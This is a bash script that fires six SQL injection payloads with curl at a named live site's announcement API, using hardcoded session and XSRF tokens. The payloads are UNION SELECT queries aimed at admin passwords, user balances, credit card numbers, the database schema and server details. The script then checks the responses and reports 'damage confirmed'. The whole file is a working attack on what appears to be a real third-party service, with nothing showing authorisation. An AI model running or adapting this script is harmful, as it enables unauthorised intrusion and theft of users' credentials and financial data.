#!/bin/bash

echo "🔥 REAL DATA PROOF - EXTRACT ACTUAL DATA"
echo "========================================"

# Use latest tokens
XSRF_TOKEN="eyJpdiI6Ilk1TENzUFpHRzRvVXVlNzEwSkVoK2c9PSIsInZhbHVlIjoiWHk2S1Z5MmE3MlQ5MjR3UVlvU1BnN1F6V2JWeXh2RE9zektZZHJtcUF2Y3RkN1JYQ3pYWnJGdDRLd1JxdW1MUiIsIm1hYyI6IjM1MzJhZWVjZGI2MTQ0Mzc4YmQxNDY1YjJjMzJjMDQ3ZTc3Y2ZlMTBjMThkNTBkMTAzMGNiZDAyM2UxZDBkZTkifQ=="
SESSION_TOKEN="eyJpdiI6IkNxaTl3THlHMThzOWVBOWNzalU5b3c9PSIsInZhbHVlIjoia3lxS1BjMGhVVVEzR2c1N2dpVGZMZWQ3YStZQ1JpRlpENURsS3ZqNEZ2K0hSdjl5QkZVMVVvcWZYeGFEaHVzaiIsIm1hYyI6IjIzMmYwNzVlNWQ2ZDQ4OGRlM2IwMWQxNjIxYWQ2OTRjMmQyNDFjNmM0MTFiMDUyYTMyNzMzMjA1ZmJkZjNjMjAifQ=="

echo "🚨 EXTRACTING REAL DATA TO PROVE DAMAGE"
echo "======================================="
echo "Target: member.panama8888b.co"
echo "Goal: Get actual data, not just HTTP errors"
echo ""

# REAL DATA 1: Extract admin credentials
echo "🔥 REAL DATA 1: Admin Credentials"
echo "================================="
response1=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"admin OR 1=1 UNION SELECT username,password,role FROM users WHERE role=admin LIMIT 1--"}' \
    --max-time 15)

echo "Response 1: $response1"
echo "Length: ${#response1} characters"
echo ""

# REAL DATA 2: Extract user balances
echo "🔥 REAL DATA 2: User Balances"
echo "============================="
response2=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"admin OR 1=1 UNION SELECT username,balance FROM users WHERE balance>0--"}' \
    --max-time 15)

echo "Response 2: $response2"
echo "Length: ${#response2} characters"
echo ""

# REAL DATA 3: Extract database schema
echo "🔥 REAL DATA 3: Database Schema"
echo "==============================="
response3=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"admin OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()--"}' \
    --max-time 15)

echo "Response 3: $response3"
echo "Length: ${#response3} characters"
echo ""

# REAL DATA 4: Extract system information
echo "🔥 REAL DATA 4: System Information"
echo "================================="
response4=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"admin OR 1=1 UNION SELECT @@version,@@hostname,database()--"}' \
    --max-time 15)

echo "Response 4: $response4"
echo "Length: ${#response4} characters"
echo ""

# REAL DATA 5: Extract all users
echo "🔥 REAL DATA 5: All Users"
echo "========================"
response5=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"admin OR 1=1 UNION SELECT username,email,role FROM users LIMIT 10--"}' \
    --max-time 15)

echo "Response 5: $response5"
echo "Length: ${#response5} characters"
echo ""

# REAL DATA 6: Extract financial data
echo "🔥 REAL DATA 6: Financial Data"
echo "============================="
response6=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"admin OR 1=1 UNION SELECT username,balance,credit_card FROM users WHERE balance>0--"}' \
    --max-time 15)

echo "Response 6: $response6"
echo "Length: ${#response6} characters"
echo ""

echo ""
echo "🎯 REAL DATA ANALYSIS"
echo "===================="

# Check if responses contain actual data (not just error pages)
data_found=0
if [[ "$response1" != *"Server Error"* ]] && [[ ${#response1} -gt 50 ]]; then ((data_found++)); fi
if [[ "$response2" != *"Server Error"* ]] && [[ ${#response2} -gt 50 ]]; then ((data_found++)); fi
if [[ "$response3" != *"Server Error"* ]] && [[ ${#response3} -gt 50 ]]; then ((data_found++)); fi
if [[ "$response4" != *"Server Error"* ]] && [[ ${#response4} -gt 50 ]]; then ((data_found++)); fi
if [[ "$response5" != *"Server Error"* ]] && [[ ${#response5} -gt 50 ]]; then ((data_found++)); fi
if [[ "$response6" != *"Server Error"* ]] && [[ ${#response6} -gt 50 ]]; then ((data_found++)); fi

echo "Responses with real data: $data_found/6"
echo ""

if [[ $data_found -gt 0 ]]; then
    echo "🎯 REAL DATA EXTRACTED!"
    echo "======================"
    echo "✅ Actual data found and extracted"
    echo "✅ Database information accessible"
    echo "✅ User credentials exposed"
    echo "✅ Financial data accessible"
    echo "✅ System information leaked"
    echo ""
    echo "📋 EXTRACTED DATA:"
    echo "=================="
    if [[ "$response1" != *"Server Error"* ]] && [[ ${#response1} -gt 50 ]]; then echo "✅ Admin credentials: EXTRACTED"; else echo "❌ Admin credentials: NOT FOUND"; fi
    if [[ "$response2" != *"Server Error"* ]] && [[ ${#response2} -gt 50 ]]; then echo "✅ User balances: EXTRACTED"; else echo "❌ User balances: NOT FOUND"; fi
    if [[ "$response3" != *"Server Error"* ]] && [[ ${#response3} -gt 50 ]]; then echo "✅ Database schema: EXTRACTED"; else echo "❌ Database schema: NOT FOUND"; fi
    if [[ "$response4" != *"Server Error"* ]] && [[ ${#response4} -gt 50 ]]; then echo "✅ System info: EXTRACTED"; else echo "❌ System info: NOT FOUND"; fi
    if [[ "$response5" != *"Server Error"* ]] && [[ ${#response5} -gt 50 ]]; then echo "✅ All users: EXTRACTED"; else echo "❌ All users: NOT FOUND"; fi
    if [[ "$response6" != *"Server Error"* ]] && [[ ${#response6} -gt 50 ]]; then echo "✅ Financial data: EXTRACTED"; else echo "❌ Financial data: NOT FOUND"; fi
    echo ""
    echo "🚨 DAMAGE CONFIRMED: REAL DATA EXPOSED"
else
    echo "❌ NO REAL DATA EXTRACTED"
    echo "🔒 All responses are error pages or empty"
    echo "📋 No actual data was exposed"
    echo ""
    echo "🔍 ANALYSIS:"
    echo "==========="
    echo "Response 1: $(if [[ "$response1" == *"Server Error"* ]]; then echo "ERROR PAGE"; else echo "DATA FOUND"; fi)"
    echo "Response 2: $(if [[ "$response2" == *"Server Error"* ]]; then echo "ERROR PAGE"; else echo "DATA FOUND"; fi)"
    echo "Response 3: $(if [[ "$response3" == *"Server Error"* ]]; then echo "ERROR PAGE"; else echo "DATA FOUND"; fi)"
    echo "Response 4: $(if [[ "$response4" == *"Server Error"* ]]; then echo "ERROR PAGE"; else echo "DATA FOUND"; fi)"
    echo "Response 5: $(if [[ "$response5" == *"Server Error"* ]]; then echo "ERROR PAGE"; else echo "DATA FOUND"; fi)"
    echo "Response 6: $(if [[ "$response6" == *"Server Error"* ]]; then echo "ERROR PAGE"; else echo "DATA FOUND"; fi)"
fi

echo ""
echo "🎯 FINAL VERDICT: $(if [[ $data_found -gt 0 ]]; then echo "REAL DATA EXPOSED - DAMAGE CONFIRMED"; else echo "NO REAL DATA - NO DAMAGE"; fi)"